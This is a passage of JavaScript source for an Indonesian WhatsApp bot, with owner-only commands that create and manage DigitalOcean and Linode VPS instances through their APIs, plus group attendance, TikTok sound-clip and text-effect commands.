      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await ptz.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break      
    case "vps4g2c": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await ptz.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break        
     case "vps8g4c": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await ptz.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
case 'svps': case 'sendvps': {
		 if (!isCreator) return (`Ngapain Pea`)
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,ip,ram,harga,passwordvps`)
            reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m223 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
            var m5 = mon.split(",")[4]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
ptz.sendMessage(mq1, {text:`*───❖》Dgf ziyo《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Your Order Arrived 📦*\n*Price : ${m4}*\n *Day : *\n*Date : *\n*Time : *\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Ip : ${m223}*\n*[ +] Username : root*\n*[+] Password : ${m5}*\n*[+] Ram : ${m3}*\n\n*───《TOS VPS》───*\n \n*-DON'T GET DDOS*\n*-DON'T USE FOR DDOS*\n*-DON'T USE FOR MINING*\n*-DON'T CPU 100%*\n*-VIOLATE THE RULES? ANGUS GUARANTEE*\n*-SUS PANEL NO REFF*`}, m)
                 }
            break
        
        // Linode
case "deletelinode": {
  if (!isCreator) return reply('Maaf, command ini hanya untuk pemilik.');

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  let deleteLinode = async () => {
    try {
      let response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.status === 204) {
        reply('Linode berhasil dihapus.');
      } else {
        throw new Error('Gagal menghapus Linode.');
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus Linode:', error);
      reply('Sukses Menghapus Linode.');
    }
  };

  deleteLinode();

  break;
}
case "sisalinode": {
  if (!isCreator) return reply("Tak nak");

  async function getLinodeInfo() {
    try {
      const response = await fetch('https://api.linode.com/v4/account', {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`,
        },
      });

      if (response.ok) {
        const accountInfo = await response.json();
        const linodeLimit = accountInfo.data.active_promo?.total || 0;
        const linodesCount = accountInfo.data.active_promo?.remaining || 0;

        return {
          linodeLimit,
          remainingLinodes: linodesCount,
          totalLinodes: linodeLimit - linodesCount,
        };
      } else {
        throw new Error('Gagal mendapatkan data akun Linode.');
      }
    } catch (error) {
      throw error;
    }
  }

  // Definisikan fungsi untuk mengeksekusi kasus "sisalinode"
  async function sisalinodtetotdler() {
    try {
      if (!isCreator) {
        return reply('Lu Siapanya Gua Anjg');
      }

      const linodeInfo = await getLinodeInfo();
      reply(`*Sisa VPS Linode Yang Dapat Anda Buat: ${linodeInfo.remainingLinodes}*

*Total VPS Linode Yang Sudah Terbuat: ${linodeInfo.totalLinodes}*`);
    } catch (error) {
      reply(`Terjadi kesalahan: ${error.message}`);
    }
  }

  sisalinodtetotdler();
  break;
}

            
            
case "rebuildlinode": {
  if (!isCreator) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Anjg`);

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  let password = args[1]; // Mengambil password dari argumen kedua (jika ada)
  if (!password) return reply('Password belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild VPS menggunakan API Linode
      const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/rebuild`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        },
        body: JSON.stringify({
          image: 'linode/ubuntu20.04', // Replace it with the ID or label of the image you want to use for rebuild
          root_pass: password // Use the password provided
        })
      });

      if (response.ok) {
        reply('Rebuild VPS berhasil dimulai.');

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const ipAddress = vpsData.ipv4[0] || 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: Ubuntu 20.04\nPASSWORD: ${password}`;
          await sleep(60000);
          ptz.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.errors[0].reason);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error.message);
    }
  };

  rebuildVPS();
  break;
}

case "linode8gb": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-4', // Spesifikasi 8GB RAM 4 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await ptz.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
           
case "linode16gb": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south',
      type: 'g6-standard-8',
      image: 'linode/ubuntu20.04',
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await ptz.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
case "cekvpslinode": {
  if (!isCreator) return reply('Maaf, perintah ini hanya untuk pemilik.');

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  // Mendapatkan informasi VPS Linode berdasarkan ID
  const getLinodeInfo = async (linodeId) => {
    try {
      const apiUrl = `https://api.linode.com/v4/linode/instances/${linodeId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.ok) {
        const linodeInfo = await response.json();

        const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode
        const ram = `${linodeInfo.specs.memory / 1024} GB`; // RAM VPS dalam GB
        const os = linodeInfo.image.distribution; // Nama OS
        const cpu = `${linodeInfo.specs.vcpus} vCPUs`; // Jumlah vCPUs
        const storage = linodeInfo.specs.disk; // Kapasitas penyimpanan
        const status = linodeInfo.status; // Status VPS

        const createDate = new Date(linodeInfo.created); // Tanggal pembuatan VPS
        const formattedCreateDate = createDate.toLocaleDateString();

        return {
          linodeid: linodeInfo.id,
          label: linodeInfo.label,
          ip: ipAddress,
          ram,
          os,
          cpu,
          storage,
          status,
          createDate: formattedCreateDate
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail Linode: ${errorData.errors[0].reason}`);
      }
    } catch (error) {
      throw new Error(`Terjadi kesalahan saat memeriksa detail Linode: ${error.message}`);
    }
  };

  getLinodeInfo(linodeId)
    .then((info) => {
      let textku = `*DETAIL VPS LINODE*\nLinode Id: ${info.linodeid}\nLabel: ${info.label}\nIP: ${info.ip}\nRAM: ${info.ram}\nOS: ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus: ${info.status}\nCreate On: ${info.createDate}\n`;
      ptz.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      ptz.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS Linode.' });
    });

  break;
}


            

case "linode2gb": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-1', // Spesifikasi 1GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await ptz.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
            
 case "linode4gb": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-2', // Spesifikasi 2GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await ptz.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;

            
case "saldolinode":
  if (!isCreator) return reply("Tak nak");

  // Endpoint untuk mengambil informasi saldo promosi Linode
  const linodePromotionsEndpoint = 'https://api.linode.com/v4/profile';

  // Konfigurasi untuk melakukan permintaan ke API Linode
  const config = {
    headers: {
      'Authorization': `Bearer ${LINODE_API_TOKEN}`
    }
  };

  // Mengambil informasi saldo promosi dari Linode
  axios.get(linodePromotionsEndpoint, config)
    .then(response => {
      // Periksa apakah saldo promosi tersedia dalam respons
      if (response.data && Array.isArray(response.data.data)) {
        // Saldo promosi dapat ada dalam elemen pertama jika ada
        const saldoPromosi = response.data.data[0].balance;
        const teksSaldo = `Sisa Kredit Promosi Linode Dalam Akun Anda Adalah $${saldoPromosi}`;
        reply(teksSaldo);
      } else {
        reply('Informasi saldo promosi tidak ditemukan atau akun tidak memiliki saldo promosi.');
      }
    })
    .catch(error => {
      console.error(error);
      reply('Terjadi kesalahan saat mengambil informasi saldo promosi.');
    });

  break;




        
case "resetpassword": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  let linodeId = args[0];
  let newPassword = args[1];
  
  if (!linodeId || !newPassword) {
    return reply("Format: !resetpassword [Linode ID] [New Password]");
  }
  
  // Periksa apakah kata sandi memenuhi persyaratan keamanan yang diharapkan
  if (newPassword.length < 8) {
    return reply("Kata sandi harus memiliki setidaknya 8 karakter.");
  }
  
  try {
    const resetPassword = async () => {
      try {
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/password`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          },
          body: JSON.stringify({ root_pass: newPassword })
        });
        
        if (response.ok) {
          reply(`Kata sandi VPS Linode ID ${linodeId} berhasil direset.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal mereset kata sandi VPS Linode: ${responseData.errors[0].reason}`);
        }
      } catch (error) {
        reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${error}`);
      }
    };
    
    resetPassword();
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${err}`);
  }
}
break;



        
    case 'listlinode': {
  if (!isCreator) return reply("Anda bukan pemilik.");

  try {
    const getLinodes = async () => {
      try {
        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });
        const data = await response.json();
        return data.data || [];
      } catch (error) {
        reply('Error fetching Linodes: ' + error);
        return [];
      }
    };

    getLinodes().then(linodes => {
      let totalvps = linodes.length;
      let message = `List VPS Linode Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (linodes.length === 0) {
        message += 'Tidak ada VPS yang tersedia.';
      } else {
        linodes.forEach(linode => {
          message += `- Linode Id: ${linode.id}\n- Label: ${linode.label}\n- Region: ${linode.region}\n- IP: ${linode.ipv4[0]}\n- Ram: ${linode.specs.memory / 1024} GB\n- Cpu: ${linode.specs.vcpus} CPU\n- Status: ${linode.status}\n- Harga: $\n▬▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      ptz.sendMessage(m.chat, { text: message });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data Linode: ' + err);
  }

  break;
}
     
        
 case "offlinode": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOffLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/shutdown`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Linode):', error.message);
    }
  }

  turnOffLinode();
  break;
}

case "onlinode": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOnLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/boot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang diaktifkan...');
      } else {
        reply('Gagal mengaktifkan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mengaktifkan VPS (Linode):', error.message);
    }
  }

  turnOnLinode();
  break;
}
case "rebootlinode": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function rebootLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/reboot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang direboot...');
      } else {
        reply('Gagal me-reboot VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat me-reboot VPS (Linode):', error.message);
    }
  }

  rebootLinode();
  break;
}
    
    case 'simi':
        let chatttt = db.data.chats[m.chat];
    let argssss = m.text.split(' ');
    
            await handleSimiCommand(m, chatttt, argssss);
            break;
        
        // absen menu 
        case 'mulaiabsen': {
if (!isGroup) return reply('Hanya Di Group')
    const chatId = m.chat; 
    

    
    if (absenData[chatId]) {
        reply ('Absen sudah dimulai di obrolan ini!');
    }

   
    absenData[chatId] = {
        admin: userId, 
        participants: [], 
    };

    
    m.reply('Absen telah dimulai! Gunakan perintah *.absen* untuk bergabung dalam absen ini.');
}
break;


case 'absen': {
if (!isGroup) return reply('Hanya Di Group')
    const chatId = m.chat; 
    

   
    if (!absenData[chatId]) {
        m.reply ('Tidak ada proses absen yang sedang berlangsung di obrolan ini!');
    }
    absenData[chatId].participants.push(userId);

    m.reply('Anda telah berhasil bergabung dalam proses absen!');
}
break;

case 'cekabsen': {
if (!isGroup) return reply('Hanya Di Group')
    const chatId = m.chat;
    
    
    if (!absenData[chatId]) {
        reply ('Tidak ada proses absen yang sedang berlangsung di obrolan ini!');
    }

    
    const participants = absenData[chatId].participants;

    m.reply(`Daftar peserta absen:\n${participants.join(', ')}`);
}
break;

case 'hapusabsen': {
if (!isGroup) return reply('Hanya Di Group')
    
    const chatId = m.chat;
    if (absenData[chatId] && absenData[chatId].admin === m.sender) {
      
        delete absenData[chatId];
        
        m.reply('Proses absen telah dihapus!');
    } else {
        reply('Anda tidak memiliki izin untuk menghapus proses absen!');
    }
}
break    
        
    
     
     
     
     
     
     
     
    
        
        
        
        
        // AMPUN 
        case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'Sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
var resttt = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 ptz.sendMessage(m.chat, { audio: resttt, mimetype: 'audio/mp4', ptt: true, 
})
break
        
        
        
        
        
        
        // poto meker
        case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!text) return reply(`Example : ${prefix+command} +`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
